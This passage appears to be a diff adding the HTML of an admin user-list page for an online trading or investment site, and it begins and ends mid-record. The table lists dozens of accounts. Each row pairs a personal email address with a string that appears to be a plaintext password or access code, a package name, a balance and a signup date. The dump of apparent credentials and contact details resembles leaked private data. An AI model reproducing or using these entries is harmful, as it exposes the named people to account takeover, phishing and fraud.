+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>450</td>
+              
+              <td>2025-09-01 09:50:12</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Kiprotich</td>
+							<td id="email">osckch2@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="osckch2@gmail.com"> </td>
+							
+							<td>NwrWesD0Be</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-08-31 05:21:00</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Montero</td>
+							<td id="email">bryantkorir3@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="bryantkorir3@gmail.com"> </td>
+							
+							<td>M8rTVBN18e</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-08-28 17:43:33</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Darwin</td>
+							<td id="email">mhlongosphelele021@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="mhlongosphelele021@gmail.com"> </td>
+							
+							<td>eh7Q9VN9dh</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-08-24 06:51:05</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Hakim</td>
+							<td id="email">hakimassfar@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="hakimassfar@gmail.com"> </td>
+							
+							<td>hBTHV7hSJ5</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-08-18 17:58:34</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>kingr.ich07</td>
+							<td id="email">sarahkenny242@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="sarahkenny242@gmail.com"> </td>
+							
+							<td>hBk6hMlhT6</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-08-18 17:33:11</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Marquez</td>
+							<td id="email">ogollamarquez27@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="ogollamarquez27@gmail.com"> </td>
+							
+							<td>QTZNSh1h8s</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>1000</td>
+              
+              <td>2025-08-17 02:07:47</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Moneyzoe26</td>
+							<td id="email">brownleerhyheim040@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="brownleerhyheim040@gmail.com"> </td>
+							
+							<td>CG4ueDBPrg</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-08-09 04:10:25</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Sanna1991</td>
+							<td id="email">vissersanmari@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="vissersanmari@gmail.com"> </td>
+							
+							<td>5hjDVXChJA</td>
+							<td>1 week </td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>5200</td>
+              
+              <td>2025-08-03 09:05:54</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Harmc</td>
+							<td id="email">hartley.mccutcheon@gmail.comh</td>
+							<td style="display:none;"><input type="hidden" name="email" value="hartley.mccutcheon@gmail.comh"> </td>
+							
+							<td>jT9Me76sXS</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-07-15 16:22:24</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Kelum1988</td>
+							<td id="email">kelumraja556@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="kelumraja556@gmail.com"> </td>
+							
+							<td>sR9tAda73D</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>7000000</td>
+              
+              <td>2025-07-15 09:31:52</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>MD Sumon Hossain</td>
+							<td id="email">Sumonahmed143865@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="Sumonahmed143865@gmail.com"> </td>
+							
+							<td>NT68saV5lw</td>
+							<td> Beginner </td>
+							 <td>-6500 USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>6993531</td>
+              
+              <td>2025-07-14 08:00:36</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Igbani</td>
+							<td id="email">officialzaddyblaq@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="officialzaddyblaq@gmail.com"> </td>
+							
+							<td>P73wd9bDZS</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-07-13 04:04:09</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Youdienms Eugene</td>
+							<td id="email">youdienmseugene@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="youdienmseugene@gmail.com"> </td>
+							
+							<td>VdhlAh52My</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>1640</td>
+              
+              <td>2025-07-11 14:50:25</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Zachary23</td>
+							<td id="email">zacharygandy4@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="zacharygandy4@gmail.com"> </td>
+							
+							<td>Jyk62j8sd5</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-07-10 14:54:52</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Shadrackkubheka@gmail.com</td>
+							<td id="email">Shadrackkubheka@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="Shadrackkubheka@gmail.com"> </td>
+							
+							<td>j6NkgjXP9W</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>3461</td>
+              
+              <td>2025-06-26 12:45:58</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Chroniclesofmi</td>
+							<td id="email">micalexandria@live.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="micalexandria@live.com"> </td>
+							
+							<td>5dBeVdl737</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-06-11 19:57:13</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>davidwilliamtrace</td>
+							<td id="email">davidwilliamtrace@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="davidwilliamtrace@gmail.com"> </td>
+							
+							<td>RPw51V6B8d</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>5520</td>
+              
+              <td>2025-06-01 03:26:07</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Edmilson Frutuoso</td>
+							<td id="email">Edmilsonfrutuoso83@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="Edmilsonfrutuoso83@gmail.com"> </td>
+							
+							<td>18CPd9B7fe</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-05-26 04:47:43</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Kenpcry</td>
+							<td id="email">pavyeugene77@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="pavyeugene77@gmail.com"> </td>
+							
+							<td>273a4huceM</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-05-14 20:34:37</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>EUGENEKRYPT</td>
+							<td id="email">eukenpa@hotmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="eukenpa@hotmail.com"> </td>
+							
+							<td>lcBdJbXth5</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-05-14 20:21:47</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>EUGENEKRYP</td>
+							<td id="email">eukenpa2@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="eukenpa2@gmail.com"> </td>
+							
+							<td>BT8ce8s1Pd</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-05-14 20:03:38</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Micheal lamp</td>
+							<td id="email">margaretamgbai@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="margaretamgbai@gmail.com"> </td>
+							
+							<td>frRhhVuC69</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-05-12 18:22:29</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Patricia</td>
+							<td id="email">patriciacounts@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="patriciacounts@gmail.com"> </td>
+							
+							<td>CVBjgRT5wS</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-04-18 03:18:45</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>icon</td>
+							<td id="email">briszxyicon@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="briszxyicon@gmail.com"> </td>
+							
+							<td>S6hh7eh3Ve</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-04-15 03:01:16</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Drop55</td>
+							<td id="email">gsingleton14@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="gsingleton14@gmail.com"> </td>
+							
+							<td>WjjBhedN8w</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-04-13 17:20:56</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>skinny</td>
+							<td id="email">united.moose.nkrm@letterhaven.net</td>
+							<td style="display:none;"><input type="hidden" name="email" value="united.moose.nkrm@letterhaven.net"> </td>
+							
+							<td>NCeRBsHQuT</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-04-11 09:35:03</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>pips758</td>
+							<td id="email">lyncherlan12@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="lyncherlan12@gmail.com"> </td>
+							
+							<td>cb7JdTeVVs</td>
+							<td> Expert package </td>
+							 <td>-416 USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>-396</td>
+              
+              <td>2025-04-09 22:14:11</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>2022_0628</td>
+							<td id="email">bibteabib@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="bibteabib@gmail.com"> </td>
+							
+							<td>bbCQhc61My</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-04-05 03:04:15</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>braheembasselbraheembassel@gmail.com</td>
+							<td id="email">braheembasselbraheembassel@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="braheembasselbraheembassel@gmail.com"> </td>
+							
+							<td>gs8jd1lSDs</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-30 18:22:23</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Promisevictz</td>
+							<td id="email">promisevictz08@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="promisevictz08@gmail.com"> </td>
+							
+							<td>bbcrCGhNht</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-29 17:51:51</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Agnesmary37</td>
+							<td id="email">l4254111@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="l4254111@gmail.com"> </td>
+							
+							<td>MNN0kyCThg</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-25 11:04:21</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Edwin Ngugi</td>
+							<td id="email">ngugiedwin974@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="ngugiedwin974@gmail.com"> </td>
+							
+							<td>gChehdGVHe</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-23 06:21:30</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Damian phiri</td>
+							<td id="email">damianphiri5@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="damianphiri5@gmail.com"> </td>
+							
+							<td>ubN9Qb6leB</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-18 03:14:38</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Anthony wambugi muthami</td>
+							<td id="email">muthamianthony23@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="muthamianthony23@gmail.com"> </td>
+							
+							<td>gGeQ885efN</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-15 12:43:57</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Kenneth prosper</td>
+							<td id="email">gloverjohn042@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="gloverjohn042@gmail.com"> </td>
+							
+							<td>cMlVg91Nbe</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-13 14:55:10</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Paskal kenneth</td>
+							<td id="email">margaretamgbari@gmail.con</td>
+							<td style="display:none;"><input type="hidden" name="email" value="margaretamgbari@gmail.con"> </td>
+							
+							<td>s9QhcJVhse</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-13 14:47:52</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Joetrav</td>
+							<td id="email">akaits3nettey@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="akaits3nettey@gmail.com"> </td>
+							
+							<td>MhCDls58yf</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-13 11:09:57</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Poppacoolie79</td>
+							<td id="email">johncarloswarren@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="johncarloswarren@gmail.com"> </td>
+							
+							<td>B3h7eCTrGD</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>verified</td>
+							<td>17500</td>
+              
+              <td>2025-03-11 12:50:04</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Narcy</td>
+							<td id="email">saa005074@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="saa005074@gmail.com"> </td>
+							
+							<td>8g5SetucbN</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>450</td>
+              
+              <td>2025-03-10 18:28:28</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Nathaniel Batoon Saboy.</td>
+							<td id="email">nathaniel.saboy@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="nathaniel.saboy@gmail.com"> </td>
+							
+							<td>rlAsj91GT7</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>550</td>
+              
+              <td>2025-03-10 09:25:41</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Boneupwear726</td>
+							<td id="email">tweemzz7@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="tweemzz7@gmail.com"> </td>
+							
+							<td>atcSNrMVjZ</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-08 12:15:55</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Phaela</td>
+							<td id="email">johnnypselapisa@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="johnnypselapisa@gmail.com"> </td>
+							
+							<td>bMS6J3tXTh</td>
+							<td> Beginner </td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>3820</td>
+              
+              <td>2025-03-07 13:07:50</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Christine</td>
+							<td id="email">christineyuaya@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="christineyuaya@gmail.com"> </td>
+							
+							<td>SjWAj4ea7V</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-07 01:00:41</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Mark</td>
+							<td id="email">lisa2025lisa@outlook.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="lisa2025lisa@outlook.com"> </td>
+							
+							<td>cPCSTfd9D8</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-06 11:07:20</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>rileyyounggg</td>
+							<td id="email">riley.young76@ninonow.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="riley.young76@ninonow.com"> </td>
+							
+							<td>yUls5hh4N3</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-04 06:52:56</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Nali2002</td>
+							<td id="email">sonaligangaram3@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="sonaligangaram3@gmail.com"> </td>
+							
+							<td>cjNPZ7CSMd</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-03-01 08:17:12</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Eso</td>
+							<td id="email">olieeelliot120@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="olieeelliot120@gmail.com"> </td>
+							
+							<td>hMBhCVSCyj</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>1000</td>
+              
+              <td>2025-02-28 10:04:40</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Narcita</td>
+							<td id="email">narcitaaquisan@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="narcitaaquisan@gmail.com"> </td>
+							
+							<td>VVZDucNSaA</td>
+							<td></td>
+							 <td> USD</td>
+							<td>offline</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-02-28 05:18:57</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Toxy</td>
+							<td id="email">vonkiecoach@gmail.com</td>
+							<td style="display:none;"><input type="hidden" name="email" value="vonkiecoach@gmail.com"> </td>
+							
+							<td>3BedBHXMAN</td>
+							<td></td>
+							 <td> USD</td>
+							<td>online</td>
+							<td>not verified</td>
+							<td>20</td>
+              
+              <td>2025-02-27 14:10:58</td>
+			  
+                           
+							
+    <!--<td><button type="submit" name="delete" class="btn btn-danger"><span class="glyphicon glyphicon-trash"> Delete</span></button></td>-->
+</form>
+						</tr>
+						
+					  				
+						<tr class="primary">
+						<form action="users.php" method="post">
+<td>Lehmohj</td>
+							<td id="email">olliraclehmohj@gamil.com</td>
